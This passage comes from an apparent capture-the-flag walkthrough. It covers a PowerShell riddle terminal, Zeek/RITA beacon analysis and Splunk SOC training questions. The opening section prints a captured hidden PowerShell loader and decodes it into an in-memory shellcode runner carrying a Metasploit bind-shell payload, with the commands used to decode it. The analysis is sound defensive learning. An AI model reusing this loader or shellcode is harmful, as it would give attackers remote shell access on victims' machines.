obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKS&amp;lt;br&amp;gt;hHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvx&amp;lt;br&amp;gt;JCgAA&#39;&#39;))),System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&#39;;$s.UseShellExecute=$false;$s.Redirec&amp;lt;br&amp;gt;tStandardOutput=$true;$s.WindowStyle=&#39;Hidden&#39;;$s.CreateNoWindow=$true;$p=System.Diagnostics.Process]::Start($s);\\&quot;&quot;,&quot;event_type&quot;: &quot;process&quot;,&quot;logon_id&quot;: 999,&quot;parent_process_name&quot;: &quot;cmd.exe&quot;,&quot;parent_process_path&quot;: &quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;,&quot;pid&quot;: 3824,&amp;lt;br&amp;gt; &quot;ppid&quot;: 3768,&quot;process_name&quot;: &quot;powershell.exe&quot;,&quot;process_path&quot;: &quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;,&quot;subtype&quot;: &quot;create&quot;,&quot;timestamp&quot;: 132186397859599980,&quot;unique_pid&quot;: &quot;{7431d376-dea9-5dd3-0000-00108f774f00}&quot;,&quot;unique_ppid&quot;: &quot;{7431d376-dea9-5dd3-0000-001024764f00}&quot;,&quot;user&quot;: &quot;NT AUTHORITY\\\\SYSTEM&quot;,&quot;user_domain&quot;: &quot;NT AUTHORITY&quot;,&quot;user_name&quot;: &quot;SYSTEM&quot;}Taking the powershell code and formatting it nicely gives:if ([IntPtr]::Size - eq 4) { $b = &#39;powershell.exe&#39;} else { $b = $env: windir + &#39;\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&#39;};$s = New - Object System.Diagnostics.ProcessStartInfo;$s.FileName = $b;$s.Arguments = &#39;-noni -nop -w hidden -c &amp;amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(&#39; &#39;H4sIAKne010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEniDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2etYJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mIdlNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4VqB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcwYlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KYqglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiYSDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSqDvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo9925cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLafNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKShHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvxJCgAA&#39; &#39;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&#39;;$s.UseShellExecute = $false;$s.RedirectStandardOutput = $true;$s.WindowStyle = &#39;Hidden&#39;;$s.CreateNoWindow = $true;$p = [System.Diagnostics.Process]::Start($s);Extract the FromBase64String, and run it through a base64 decode with:echo -n &#39;H4sIAKne010...&#39; | base64 -d | xxd00000000: 1f8b 0800 a9de d35d 0203 b556 6d6f da48 .......]...Vmo.H00000010: 10fe 9c48 f90f 5685 84ad 108c 036d 9a48 ...H..V......m.H00000020: 956e cd9b 2138 8118 cc5b d169 63af cdc2 .n..!8...[.ic...00000030: da06 7b0d 985e fffb 8d01 a7a9 9ade b527 ..{..^.........&#39;00000040: 9d95 97f5 eecc eccc 33cf ccd8 897d 8bd3 ........3....}.....That is binary data and if you look up the first few bytes, you’ll find out that it is a GZIP file. You can save it into a file like so:echo -n &#39;H4sIAKne010...&#39; | base64 -d &amp;gt; outfile.gzThen unzip the file and look at it’s contents:ᐅ gzip -d outfile.gzᐅ cat outfilefunction uM1F { Param ($i46, $zVytt) $vwxWO = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(&#39;\\&#39;)[-1].Equals(&#39;System.dll&#39;) }).GetType(&#39;Microsoft.Win32.UnsafeNativeMethods&#39;) &amp;lt;code&amp;gt; return $vwxWO.GetMethod(&#39;GetProcAddress&#39;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($vwxWO.GetMethod(&#39;GetModuleHandle&#39;)).Invoke($null, @($i46)))), $zVytt))&amp;lt;/code&amp;gt; } function nL9 { Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $kESi, [Parameter(Position = 1)] [Type] $mVd_U = [Void] ) &amp;lt;code&amp;gt; $yv = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#39;ReflectedDelegate&#39;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#39;InMemoryModule&#39;, $false).DefineType(&#39;MyDelegateType&#39;, &#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;, [System.MulticastDelegate]) $yv.DefineConstructor(&#39;RTSpecialName, HideBySig, Public&#39;, [System.Reflection.CallingConventions]::Standard, $kESi).SetImplementationFlags(&#39;Runtime, Managed&#39;) $yv.DefineMethod(&#39;Invoke&#39;, &#39;Public, HideBySig, NewSlot, Virtual&#39;, $mVd_U, $kESi).SetImplementationFlags(&#39;Runtime, Managed&#39;) return $yv.CreateType()&amp;lt;/code&amp;gt; }[Byte[]]$dc = [System.Convert]::FromBase64String(&quot;/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqFaAaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=&quot;) $oDm = &amp;lt;a href=&quot;:Copy&quot;&amp;gt;System.Runtime.InteropServices.Marshal&amp;lt;/a&amp;gt;::GetDelegateForFunctionPointer((uM1F kernel32.dll VirtualAlloc), (nL9 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dc.Length,0x3000, 0x40) $lHZX = &amp;lt;a href=&quot;:Copy&quot;&amp;gt;System.Runtime.InteropServices.Marshal&amp;lt;/a&amp;gt;::GetDelegateForFunctionPointer((uM1F kernel32.dll CreateThread), (nL9 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$oDm,[IntPtr]::Zero,0,[IntPtr]::Zero) &amp;lt;a href=&quot;:Copy&quot;&amp;gt;System.Runtime.InteropServices.Marshal&amp;lt;/a&amp;gt;::GetDelegateForFunctionPointer((uM1F kernel32.dll WaitForSingleObject), (nL9 @([IntPtr], [Int32]))).Invoke($lHZX,0xffffffff) | Out-NullThis is more powershell exploit script, and there’s another base64 encoded payload. Decode it the same way as before to get another binary string.ᐅ echo -n &#39;/OiCAAAAYInlMc...&#39; | base64 -d | xxd00000000: fce8 8200 0000 6089 e531 c064 8b50 308b ......`..1.d.P0.00000010: 520c 8b52 148b 7228 0fb7 4a26 31ff ac3c R..R..r(..J&amp;amp;1..&amp;lt;00000020: 617c 022c 20c1 cf0d 01c7 e2f2 5257 8b52 a|., .......RW.R00000030: 108b 4a3c 8b4c 1178 e348 01d1 518b 5920 ..J&amp;lt;.L.x.H..Q.Y00000040: 01d3 8b49 18e3 3a49 8b34 8b01 d631 ffac ...I..:I.4...1..00000050: c1cf 0d01 c738 e075 f603 7df8 3b7d 2475 .....8.u..}.;}$u00000060: e458 8b58 2401 d366 8b0c 4b8b 581c 01d3 .X.X$..f..K.X...00000070: 8b04 8b01 d089 4424 245b 5b61 595a 51ff ......D$$[[aYZQ.00000080: e05f 5f5a 8b12 eb8d 5d68 3332 0000 6877 .__Z....]h32..hw00000090: 7332 5f54 684c 7726 0789 e8ff d0b8 9001 s2_ThLw&amp;amp;........000000a0: 0000 29c4 5450 6829 806b 00ff d56a 0a68 ..).TPh).k...j.h000000b0: c0a8 5680 6802 0011 5c89 e650 5050 5040 ..V.h...\\..PPPP@000000c0: 5040 5068 ea0f dfe0 ffd5 976a 1056 5768 P@Ph.......j.VWh000000d0: 99a5 7461 ffd5 85c0 740a ff4e 0875 ece8 ..ta....t..N.u..000000e0: 6700 0000 6a00 6a04 5657 6802 d9c8 5fff g...j.j.VWh..._.000000f0: d583 f800 7e36 8b36 6a40 6800 1000 0056 ....~6.6j@h....V00000100: 6a00 6858 a453 e5ff d593 536a 0056 5357 j.hX.S....Sj.VSW00000110: 6802 d9c8 5fff d583 f800 7d28 5868 0040 h..._.....}(Xh.@00000120: 0000 6a00 5068 0b2f 0f30 ffd5 5768 756e ..j.Ph./.0..Whun00000130: 4d61 ffd5 5e5e ff0c 240f 8570 ffff ffe9 Ma..^^..$..p....00000140: 9bff ffff 01c3 29c6 75c1 c3bb e01d 2a0a ......).u.....*.00000150: 68a6 95bd 9dff d53c 067c 0a80 fbe0 7505 h......&amp;lt;.|....u.00000160: bb47 1372 6f6a 0053 ffd5Looking this code up online shows that it is a shellcode created from metasploit with msfvenom -p windows/shell\\_bind\\_tcp -f cHowever, it is supremely unhelpful in solving the Objective. What a waste of time.Objective 5 – Network Log Analysis: Determine Compromised System The attacks don’t stop! Can you help identify the IP address of the malware-infected system using these Zeek logs? _For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry. Answer: 192.168.134.130 This is another defense related objective where you have to dig through logs and find evidence of the bad guy. You can get a hint on how to analyze these logs from Sparkle Redberry in the Laboratory.Terminal Challenge – Xmas Cheer Laser I&amp;#8217;m Sparkle Redberry and Imma chargin&amp;#8217; my laser! Problem is: the settings are off. Do you know any PowerShell? It&amp;#8217;d be GREAT if you could hop in and recalibrate this thing. It spreads holiday cheer across the Earth … … when it&amp;#8217;s working! Sparkle RedberryThis terminal challenge is about figuring out how to make PowerShell do what you want in order to solve riddles (a LOT of them). You’re given a PowerShell prompt that can only process PowerShell commands.Elf University Student Research Terminal - Christmas Cheer Laser ProjectThe research department at Elf University is currently working on a top-secretLaser which shoots laser beams of Christmas cheer at a range of hundreds of miles. The student research team was successfully able to tweak the laser to JUST the right settings to achieve 5 Mega-Jollies per liter of laser output. Unfortunately, someone broke into the research terminal, changed the laser settings through the Web API and left a note behind at /home/callingcard.txt. Read the calling card and follow the clues to find the correct laser Settings.Apply these correct settings to the laser using it&#39;s Web API to achieve laser output of 5 Mega-Jollies per liter. Use (Invoke-WebRequest -Uri http://localhost:1225/).RawContent for more info. The goal of this challenge is to find the correct settings to calibrate the laser with and apply them. To accomplish that, you have to answer a string of riddles that lead one to another and along the way you will see the calibration settings scattered here and there.I’ll step through the riddles and their solutions and highlight the calibration settings. At the end I’ll point out which setting was found at which riddle.Riddle 1 – callingcard.txtA clue to this riddle was given in the banner text, “/home/callingcard.txt” and this is how to read it:PS /home/elf&amp;gt; Get-Content /home/callingcard.txtWhat&#39;s become of your dear laser?Fa la la la la, la la la laSeems you can&#39;t now seem to raise her!Fa la la la la, la la la laCould commands hold riddles in hist&#39;ry?Fa la la la la, la la la laNay! You&#39;ll ever suffer myst&#39;ry!Fa la la la la, la la la laSince the riddle mentions history, use “Get-History” command to retrieve the command line history.PS /home/elf&amp;gt; Get-History Id CommandLine -- ----------- 1 Get-Help -Name Get-Process 2 Get-Help -Name Get-* 3 Set-ExecutionPolicy Unrestricted 4 Get-Service | ConvertTo-HTML -Property Name, Status &amp;gt; C:\\services.htm 5 Get-Service | Export-CSV c:\\service.csv 6 Get-Service | Select-Object Name, Status | Export-CSV c:\\service.csv 7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent 8 Get-EventLog -Log &quot;Application&quot; 9 I have many name=value variables that I share to applications system wide. At a command I w… 10 Get-Content /home/callingcard.txtThere’s a calibration settings in the history, along with the next riddle, at position number 9. To inspect it further, use “Get-History -ID” and “Format-List -Property” to show everything about that entry.Riddle 2 – EnvironmentPS /home/elf&amp;gt; Get-History -ID 9 | Format-List -Property *Id : 9CommandLine : I have many name=value variables that I share to applications system wide. At a command I will reveal my secrets once you Get my Child Items.ExecutionStatus : CompletedStartExecutionTime : 11/29/19 4:57:16 PMEndExecutionTime : 11/29/19 4:57:16 PMDuration : 00:00:00.6090308The riddle mentions name=value variables, and that is referring to environment variables. To see them, use the command Get-ChildItems env: and it requires the colon at the end.PS /home/elf&amp;gt; Get-ChildItem env:Name Value---- -----_ /bin/suDOTNET_SYSTEM_GLOBALIZATION_I… falseHOME /home/elfHOSTNAME 040650f40b8eLANG en_US.UTF-8LC_ALL en_US.UTF-8LOGNAME elfMAIL /var/mail/elfPATH /opt/microsoft/powershell/6:/usr/local/sbin:/usr/local/bin:/usr/s…PSModuleAnalysisCachePath /var/cache/microsoft/powershell/PSModuleAnalysisCache/ModuleAnaly…PSModulePath /home/elf/.local/share/powershell/Modules:/usr/local/share/powers…PWD /home/elfRESOURCE_ID 79d5b2ca-1002-4fa7-9d84-dd93e1585089riddle Squeezed and compressed I am hidden away. Expand me from my priso…SHELL /home/elf/elfSHLVL 1TERM xtermUSER elfUSERDOMAIN laserterminaluserdomain laserterminalusername elfUSERNAME elfThe next riddle is the “riddle” variable. Use the command Get-Content env:riddle to see the whole thing.Riddle 3 – Recurse /etc/PS /home/elf&amp;gt; Get-Content env:riddleSqueezed and compressed I am hidden away. Expand me from my prison and I will show you the way. Recurse through all /etc and Sort on my LastWriteTime to reveal im the newest of all.The riddle tells us to go through all the files and folders of /etc and find the newest file. Use the command cd /etc; Get-ChildItem -Recurse | Sort-Object -Property LastWriteTime. That will change to the /etc directory, then get all the files and folders with Get-ChildItem, then it sorts them based on the property LastWriteTime.It will show five files that have a newer date than the rest.Directory: /etcMode LastWriteTime Length Name---- ------------- ------ ------r--- 12/13/19 5:16 PM 575 group------- 12/13/19 5:16 PM 476 gshadow---r--- 12/13/19 5:16 PM 581 group------ 12/13/19 5:16 PM 482 gshadow-----l 1/10/20 9:47 PM 12 mtab--r--- 1/10/20 9:47 PM 174 hosts--r--- 1/10/20 9:47 PM 113 resolv.conf--r--- 1/10/20 9:47 PM 13 hostname Directory: /etc/aptMode LastWriteTime Length Name---- ------------- ------ ------r--- 1/10/20 9:47 PM 5662902 archiveThe most interesting one is “archive”. To see what’s inside, use the command Expand-Archive -Path apt/archive -DestinationPath &#39;/home/elf/archive/&#39;. Then go back to the home directory and look at the archive folder.PS /etc&amp;gt; cd /home/elf; Get-ChildItem archive Directory: /home/elf/archiveMode LastWriteTime Length Name---- ------------- ------ ----d----- 1/10/20 9:53 PM refractionThere’s another folder called ‘refraction’. Go to that directory and use Get-ChildItem to list its contents.PS /home/elf&amp;gt; cd archive/refractionPS /home/elf/archive/refraction&amp;gt; Get-ChildItem Directory: /home/elf/archive/refractionMode LastWriteTime Length Name---- ------------- ------ ---------- 11/7/19 11:57 AM 134 riddle------ 11/5/19 2:26 PM 5724384 runme.elfThe “runme.elf” file is clearly a binary file if you try to get it’s contents, so to run it you have to change it’s mode properties. You can actually use a few standard bash shell commands here, and “chmod” is one of them.PS /home/elf/archive/refraction&amp;gt; chmod +x runme.elfPS /home/elf/archive/refraction&amp;gt; ./runme.elf refraction?val=1.867That program prints out another one of the laser values. The other file in that directory is the next riddle.Riddle 4 – md5 Hash SearchPS /home/elf/archive/refraction&amp;gt; Get-Content riddleVery shallow am I in the depths of your elf home. You can find my entity by using my md5 identity:25520151A320B5B0D21561F92C8F6224Following clues in this riddle, look at all the files and directories within /home/elf.PS /home/elf/archive/refraction&amp;gt; cd PS /home/elf&amp;gt; Get-ChildItem Directory: /home/elfMode LastWriteTime Length Name---- ------------- ------ ----d----- 1/11/20 3:28 AM archived-r--- 12/13/19 5:15 PM depths--r--- 12/13/19 4:29 PM 2029 motdThe “depths” directory matches clues in the riddle, so search in there for a file with the md5 hash of “25520151A320B5B0D21561F92C8F6224”. To do so will require a couple lines of commands. You can use shortcuts for common PowerShell cmdlets such as “gci” for “Get-ChildItem”.PS /home/elf&amp;gt; gci -File -Recurse -Depth 2 -Path &#39;depths&#39; | Get-FileHash -Algorith MD5 | Format-List &amp;gt; out.txt PS /home/elf&amp;gt; gc out.txt | Select-String -Pattern &quot;25520151A320B5B0D21561F92C8F6224&quot; -SimpleMatch -Context 1,1 Algorithm : MD5&amp;gt; Hash : 25520151A320B5B0D21561F92C8F6224 Path : /home/elf/depths/produce/thhy5hll.txtThe discovered file gives you another laser parameter value and the next riddle.Riddle 5 – Deepest DirectoryPS /home/elf&amp;gt; gc /home/elf/depths/produce/thhy5hll.txttemperature?val=-33.5I am one of many thousand similar txt&#39;s contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName&#39;s to Sort Length.The PowerShell code to solve this riddle’s clue is kind of complex:First recursively list out directory contents of “depths”.Second, Select the objects’ full pathname and calculate the length of the paths.Third, sort against the calculated length and display the output.PS /home/elf&amp;gt; gci &quot;./*&quot; -File -Recurse -Path &quot;depths&quot; | select-object FullName, @{Name=&quot;Nlength&quot;;Expression={$_.FullName.Length}} | sort-object Nlength | Format-List...FullName : /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/v ote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefo re/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/end /accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/ accident/labor/sail/dropped/fox/0jhj5xz6.txtNlength : 388Dump the contents of the file to see the next riddle.Riddle 6 – Kill their JobsPS /home/elf&amp;gt; gc /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/end/accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txtGet process information to include Username identification. Stop Process to show me you&#39;re skilled and in this order they must be killed:bushyalabastermintyhollyDo this for me and then you /shall/see .In this riddle, you have to list processes by owner and kill those in a certain order.First, use the command Get-Process -IncludeUserName to list those jobs.Second, use Stop-Process -ID -Force to kill processes by their ID.If you kill the processes in the correct order, you will get the next riddle in a file called /home/elf/shall/seeRiddle 7 – Event Log ID’sPS /home/elf&amp;gt; Get-Content /shall/seeGet the .xml children of /etc - an event log to be found. Group all .Id&#39;s and the last thing will be in the Properties of the lonely unique event Id.This riddle wants you to parse through an EventLog and group events by Id. The solution will involve the event that is in its own group.To solve this riddle, first, find the XML file in “/etc” using the command Get-ChildItem -Recurse -Path &quot;/etc/&quot; -Include &quot;*.xml&quot;.Second, change to the directory of the file that was found to make the rest easier, cd /etc/systemd/system/timers.target.wants/.Third, use Select-String -Path ./EventLog.xml -Pattern ‘N=”Id”&amp;gt;(.*)&amp;lt;‘ -AllMatches to parse the event log for matches to the specified regular expression. That will collect all the event id’s since they begin with ‘&amp;lt;I32 N=”Id”&amp;gt;’ tag. To verify that you can dump the contents of EventLog.xml and look for some of the described tags. Pipe the matches into a “Group-Object” command by their value, using | % {$_.matches.groups[1].value} | Group-Object.PS /etc/systemd/system/timers.target.wants&amp;gt; Select-String -Path ./EventLog.xml -Pattern &#39;N=&quot;Id&quot;&amp;gt;(.*)&amp;lt;&#39; -AllMatches | % {$_.matches.groups[1].value} | Group-ObjectCount Name Group----- ---- ----- 1 1 {1} 39 2 {2, 2, 2, 2…} 179 3 {3, 3, 3, 3…} 2 4 {4, 4} 905 5 {5, 5, 5, 5…} 98 6 {6, 6, 6, 6…}The EventID that is all alone is “1”. Search for it in the file with a command like Select-String -Path ./EventLog.xml -Pattern ‘N=”id”&amp;gt;1&amp;lt;‘ -Context 8,200 and look for soemthing interesting in its Properties. You should find the last laser parameter needed.ParametersFirst, get information about the API using the command included in the bannertext of the terminal challenge. It shows how to set the variables needed to calibrate the laser.PS /home/elf&amp;gt; (Invoke-WebRequest -Uri http://localhost:1225/).RawContentHTTP/1.0 200 OK Server: Werkzeug/0.16.0 Server: Python/3.6.9 Date: Sat, 11 Jan 2020 05:09:18 GMT Content-Type: text/html; charset=utf-8Content-Length: 860&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;----------------------------------------------------Christmas Cheer Laser Project Web API----------------------------------------------------Turn the laser on/off:GET http://localhost:1225/api/onGET http://localhost:1225/api/offCheck the current Mega-Jollies of laser outputGET http://localhost:1225/api/outputChange the lense refraction value (1.0 - 2.0):GET http://localhost:1225/api/refraction?val=1.0Change laser temperature in degrees Celsius:GET http://localhost:1225/api/temperature?val=-10Change the mirror angle value (0 - 359):GET http://localhost:1225/api/angle?val=45.1Change gaseous elements mixture:POST http://localhost:1225/api/gasPOST BODY EXAMPLE (gas mixture percentages):O=5&amp;amp;H=5&amp;amp;He=5&amp;amp;N=5&amp;amp;Ne=20&amp;amp;Ar=10&amp;amp;Xe=10&amp;amp;F=20&amp;amp;Kr=10&amp;amp;Rn=10----------------------------------------------------&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;Parameter Angle:Found in Riddle 1Command is (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContentParameter Refraction:Found in Riddle 3refraction?val=1.867Command is (Invoke-WebRequest http://127.0.0.1:1225/api/refraction?val=1.867).RawContentParameter Temperature:Found in Riddle 4temperature?val=-33.5Command is (Invoke-WebRequest http://127.0.0.1:1225/api/temperature?val=-33.5).RawContentParameter Gases:Found in Riddle 7powershell.exe -c “`$correct_gases_postbody = @{O=6H=7He=3N=4Ne=22Ar=11Xe=10F=20Kr=8Rn=9}”Command is (Invoke-WebRequest -Uri “http://127.0.0.1:1225/api/gas?val=65.5” -Method POST -Body “O=6&amp;amp;H=7&amp;amp;He=3&amp;amp;N=4&amp;amp;Ne=22&amp;amp;Ar=11&amp;amp;Xe=10&amp;amp;F=20&amp;amp;Kr=8&amp;amp;Rn=9”).RawContentAfter inputting those API commands, check the output with “/api/output” to complete the challenge.PS /home/elf&amp;gt; (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent HTTP/1.0 200 OK Server: Werkzeug/0.16.0 Server: Python/3.6.9 Date: Sat, 11 Jan 2020 05:25:25 GMT Content-Type: text/html; charset=utf-8Content-Length: 200Success! - 6.76 Mega-Jollies of Laser Output Reached!The hint that Sparkle Redberry gives after completing the challenge is: You got it &amp;#8211; three cheers for cheer!For objective 5, have you taken a look at our Zeek logs? Something&amp;#8217;s gone wrong. But I hear someone named Rita can help us. Can you and she figure out what happened? Sparkle RedberrySolutionThe hint refers to the analysis software RITA. It didn’t install on my Kali box for some reason, so I downloaded a virtual machine for Blue Team operations called “SecurityOnion”, where RITA comes installed. After much struggling trying to get RITA to complete the analysis I finally figured out that in the “elfu-zeeklogs” download, there was a pre-generated RITA report!! What a waste of time getting it to run the analysis myself, probably a whole day’s worth.If you go to “elfu-zeeklogs/ELFU/index.html” you’ll see the report. Pretty much the only thing that’s useful is the “Beacons” tab found at the top. Suspicious connections have high counts and should be at the top of the list.Since the Objective is to find the IP address of the malware-infected system, get the source address for the top result and submit it as the answer.You can now speak to Santa again and get more dialogue to unlock more Objectives. Thank you for finding Jane and Michael, our two turtle doves!I’ve got an uneasy feeling about how they disappeared.Turtle doves wouldn’t wander off like that.Someone must have stolen them! Please help us find the thief!It’s a moral imperative!I think you should look for an entrance to the steam tunnels and solve Challenge 6 and 7 too!Gosh, I can’t help but think:Winds in the East, snow coming in…Like something is brewing and about to begin!Can’t put my finger on what lies in store,But I fear what’s to happen all happened before! SantaObjective 6 – Splunk Access https://splunk.elfu.org/ as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along! _For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas. Answer: &amp;#8220;Kent you are so unfair. And we were going to make you the king of the Winter Carnival.&amp;#8221; This Objective is all about analyzing event log data with a Splunk App the ElfU SOC made. The Objective text directs you to Professor Banas for a hint but he really doesn’t give you any. He just ties in the storyline to visit the Splunk App. Hi, I&amp;#8217;m Dr. Banas, professor of Cheerology at Elf University.This term, I&amp;#8217;m teaching &amp;#8220;HOL 404: The Search for Holiday Cheer in Popular Culture,&amp;#8221; and I&amp;#8217;ve had quite a shock!I was at home enjoying a nice cup of Gløgg when I had a call from Kent, one of my students who interns at the Elf U SOC.Kent said that my computer has been hacking other computers on campus and that I needed to fix it ASAP!If I don&amp;#8217;t, he will have to report the incident to the boss of the SOC.Apparently, I can find out more information from this website https://splunk.elfu.org/ with the username: elf / Password: elfsocks.I don&amp;#8217;t know anything about computer security. Can you please help me? Professor BanasWhen you visit the Splunk site given, you’ll see a chat app with several elf members of the ELFU Security Operations Center. Since Prof Banas said to talk to Kent, click on his name on the left and see what chat text is available. Ultimately, the goal of the Splunk Objective is to find the message left for Kent in the event log.If you go through the chats that are available, you’ll get to talk to Alice Bluebird, who guides you through completing the training questions to the right side of the screen. By the time you finish the training questions you should be able to use what you’ve learned to figure out what the message for Kent is. Use the Search tab at the top of the page to analyze the event log data to get the answers.Training Question 1What is the short host name of Professor Banas’ computer?Answer – sweetumsThis is found in the chat with #ELFU SOC.Training Question 2What is the name of the sensitive file that was likely accessed and copied by the attacker? Please provide the fully qualified location of the file. (Example: C:\\temp\\report.pdf)Answer – C:\\Users\\cbanas\\Documents\\Naughty_and_Nice_2019_draft.txtThis is found by searching for “Santa”Training Question 3What is the fully-qualified domain name(FQDN) of the command and control(C2) server? (Example: badguy.baddies.com)Answer – 144.202.46.214.vultr.comTo find the answer, search:sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=3 powershellThen look at the Interesting Field “dest_host” on the left of the page.Training Question 4What document is involved with launching the malicious PowerShell code? Please provide just the filename. (Example: results.txt)Answer – 19th Century Holiday Cheer Assignment.docmFollow Alice Bluebird’s instructions by first searching for:index=main sourcetype=&quot;WinEventLog:Microsoft-Windows-Powershell/Operational&quot; | reverseThen follow her instructions to pivot on time: Look at the&amp;nbsp;Time&amp;nbsp;column in your search results. If you click on the date/timestamp from that first event, you can specify a time window. 